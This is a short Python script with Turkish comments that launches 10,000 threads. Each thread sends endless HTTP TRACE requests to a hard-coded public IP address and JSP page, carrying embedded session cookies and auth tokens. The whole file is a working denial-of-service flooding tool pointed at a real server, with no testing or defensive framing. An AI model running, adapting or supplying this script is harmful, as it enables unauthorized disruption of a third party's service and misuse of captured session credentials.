import requests
import threading

# Hedef URL
url = "http://45.143.99.133:80/adsoyadv1.jsp"

# Cookie bilgileri
cookies = {
    'PHPSESSID': 'h5b2819q3vc0o7qagqhnbojlpi',
    'JSPAUTH': '2d057d0dcb40e7a0ad68f21109059d257e09ee6f811dd4ff410a9dc55321e5a16b2c5ed783656a98f6f2da97d3011cb458f72b9ff299e242b09e4c2d735934cb'
}

# TRACE isteği gönderme fonksiyonu
def send_trace_request():
    while True:
        try:
            response = requests.request('TRACE', url, cookies=cookies)
            print(f"Status Code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Request failed: {e}")

# Sonsuz iş parçacığı (thread) oluşturma ve başlatma
def create_threads(num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_trace_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Örnek kullanım: 10 iş parçacığı ile sonsuz TRACE isteği gönderme
create_threads(10000)
